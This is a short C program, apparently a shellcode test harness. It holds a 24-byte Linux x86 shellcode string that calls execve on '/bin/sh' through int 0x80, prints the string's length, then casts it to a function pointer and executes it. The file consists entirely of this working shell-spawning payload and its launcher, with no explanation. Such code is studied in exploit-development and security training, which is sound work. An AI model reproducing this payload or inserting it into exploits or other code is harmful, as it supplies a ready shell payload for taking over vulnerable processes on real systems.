#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\xeb\x0a\x6a\x0b\x58\x5b\x31\xc9\x31\xd2\xcd\x80\xe8\xf1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}
